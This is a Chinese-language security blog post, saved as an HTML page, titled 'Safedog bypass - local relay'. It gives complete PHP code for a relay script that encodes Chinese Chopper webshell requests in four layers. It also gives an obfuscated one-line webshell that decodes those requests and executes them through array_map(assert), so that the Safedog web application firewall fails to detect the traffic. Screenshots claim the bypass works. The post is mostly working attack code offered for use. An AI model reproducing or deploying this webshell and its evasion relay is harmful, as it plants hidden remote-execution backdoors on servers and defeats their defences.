@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.7.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-tonyGreen.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tony.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tony.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"redn3ck.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
+<meta name="keywords" content="安全狗,绕过,bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全狗绕过 - 本地中转bypass">
+<meta property="og:url" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/index.html">
+<meta property="og:site_name" content="redn3ck&#39;s blog">
+<meta property="og:description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/phpinfo.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/caidao.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/bypass-safedog.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/bypass-caidao.png">
+<meta property="og:updated_time" content="2018-08-10T09:27:55.913Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安全狗绕过 - 本地中转bypass">
+<meta name="twitter:description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
+<meta name="twitter:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/phpinfo.png">
+
+<link rel="canonical" href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>安全狗绕过 - 本地中转bypass | redn3ck's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">redn3ck's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">人不会飞就努力学走</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-read">
+
+    <a href="/read/" rel="section"><i class="fa fa-book fa-fw"></i>读书</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blogAvatar2.jpg">
+      <meta itemprop="name" content="redn3ck">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="redn3ck's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          安全狗绕过 - 本地中转bypass
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-07-22 20:52:07" itemprop="dateCreated datePublished" datetime="2018-07-22T20:52:07+08:00">2018-07-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-08-10 17:27:55" itemprop="dateModified" datetime="2018-08-10T17:27:55+08:00">2018-08-10</time>
+              </span>
+
+          
+            <span id="/2018/07/22/安全狗绕过-本地中转bypass/" class="post-meta-item leancloud_visitors" data-flag-title="安全狗绕过 - 本地中转bypass" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2018/07/22/安全狗绕过-本地中转bypass/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/07/22/安全狗绕过-本地中转bypass/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。</p>
+<p>究其原因：菜刀请求关键字等被安全狗识别导致中断请求。</p>
+<p>构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。</p>
+<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>客户端即中转脚本<code>transfer.php</code></p>
+<p>客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为<br><a id="more"></a></p>
+<blockquote>
+<p><code>base64_encode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_encode()</code></p>
+</blockquote>
+<p>经过这4层编码，对服务端发送请求。</p>
+<figure class="highlight php"><figcaption><span>客户端：transfer.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$DS = base64_encode($str);</span><br><span class="line">	$DS = str_rot13($DS);</span><br><span class="line">	$DS = strrev($DS);</span><br><span class="line">	$DS = base64_encode($DS);</span><br><span class="line">	<span class="keyword">return</span> $DS;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// webshell地址，transServ.php为定制一句话</span></span><br><span class="line">	$webshell = <span class="string">'http://127.0.0.1/transServ.php'</span>;</span><br><span class="line">	$pdata = $_POST;</span><br><span class="line">	<span class="keyword">foreach</span>($pdata <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">		<span class="keyword">if</span>(is_array($value))&#123;</span><br><span class="line">			$value=implode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 菜刀密码</span></span><br><span class="line">		<span class="keyword">if</span>($key == <span class="string">'pass'</span>) &#123;</span><br><span class="line">			$pdata[$key] = encode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	$data = http_build_query($pdata);</span><br><span class="line">	</span><br><span class="line">	$opts = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'http'</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,</span><br><span class="line">		<span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> . <span class="string">"Content-Length: "</span> . strlen($data) . <span class="string">"\r\n"</span>,</span><br><span class="line">		<span class="string">'content'</span> =&gt; $data)</span><br><span class="line">	);</span><br><span class="line">	$context = stream_context_create($opts);</span><br><span class="line">	<span class="comment">// 创建资源流上下文,数据包</span></span><br><span class="line">	$html = @file_get_contents($webshell, <span class="keyword">false</span>, $context);</span><br><span class="line">	<span class="keyword">echo</span> $html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>服务端只需对请求进行解码操作，然后正常使用菜刀一句话即可，解码顺序依次为</p>
+<blockquote>
+<p><code>base64_decode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_decode()</code></p>
+</blockquote>
+<p>此处使用<code>array_map()</code>回调后门，为保证新旧菜刀均可使用</p>
+<blockquote>
+<p>版本需求：<code>php&gt;5.2</code></p>
+</blockquote>
+<figure class="highlight php"><figcaption><span>服务端：transServ.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$DS = @$<span class="comment">/*-*/</span>&#123;<span class="string">"_P"</span>.<span class="string">"OST"</span>&#125;[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($DS) )&#123;</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @strrev($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @str_rot13($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	@array_map(assert,(<span class="keyword">array</span>)$DS);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><h2 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h2><p><img src="phpinfo.png" alt="phpinfo"></p>
+<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>连接本地中转脚本，中转脚本对webshell发送编码后请求。</p>
+<p><img src="caidao.png" alt="caidao"></p>
+<h2 id="bypass安全狗"><a href="#bypass安全狗" class="headerlink" title="bypass安全狗"></a>bypass安全狗</h2><p><img src="bypass-safedog.png" alt="bypass-safedog"><br><img src="bypass-caidao.png" alt="bypass-caidao"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>redn3ck
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/" title="安全狗绕过 - 本地中转bypass">https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/安全狗/" rel="tag"><i class="fa fa-tag"></i> 安全狗</a>
+              <a href="/tags/绕过/" rel="tag"><i class="fa fa-tag"></i> 绕过</a>
+              <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/04/25/Oracle注入-命令执行-Shell反弹/" rel="prev" title="Oracle注入 - 命令执行&Shell反弹">
+      <i class="fa fa-chevron-left"></i> Oracle注入 - 命令执行&Shell反弹
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/08/29/Struts2-S2-057复现-CVE-2018-11776/" rel="next" title="Struts2 - S2-057复现 (CVE-2018-11776)">
+      Struts2 - S2-057复现 (CVE-2018-11776) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#客户端"><span class="nav-text">客户端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#服务端"><span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#连接"><span class="nav-text">连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器验证"><span class="nav-text">浏览器验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#菜刀连接"><span class="nav-text">菜刀连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass安全狗"><span class="nav-text">bypass安全狗</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="redn3ck"
+      src="/images/blogAvatar2.jpg">
+  <p class="site-author-name" itemprop="name">redn3ck</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/redn3ck" title="GitHub → https://github.com/redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ==" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.qinqinyo.com" title="http://blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">redn3ck</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va","app_key":"34qnzvkVKBvjy44KTH7uurgw","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va',
+      appKey     : '34qnzvkVKBvjy44KTH7uurgw',
+      placeholder: "整点？",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
